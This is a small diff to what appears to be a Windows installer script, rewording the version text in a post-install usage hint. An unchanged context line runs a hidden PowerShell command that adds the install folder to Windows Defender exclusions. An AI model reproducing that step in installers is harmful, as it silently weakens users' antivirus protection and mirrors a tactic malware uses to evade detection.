@@ -60,7 +60,7 @@ Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environmen
 ; Add install folder to Windows Defender exclusions (prevents false positives)
 Filename: "powershell.exe"; Parameters: "-NoProfile -Command Add-MpPreference -ExclusionPath '{app}'"; Flags: runhidden waituntilterminated; StatusMsg: "Adding to Windows Defender exclusions..."
 ; Show a brief usage hint after install
-Filename: "cmd.exe"; Parameters: "/k echo {#MyAppName} v{#MyAppVersion} & ""{app}\{#MyAppExeName}"" -h"; Flags: nowait postinstall skipifsilent; Description: "Show usage"
+Filename: "cmd.exe"; Parameters: "/k echo {#MyAppName} Version: {#MyAppVersion} & ""{app}\{#MyAppExeName}"" -h"; Flags: nowait postinstall skipifsilent; Description: "Show usage"
 
 [Code]
 // ─── PATH manipulation (system-wide) ───
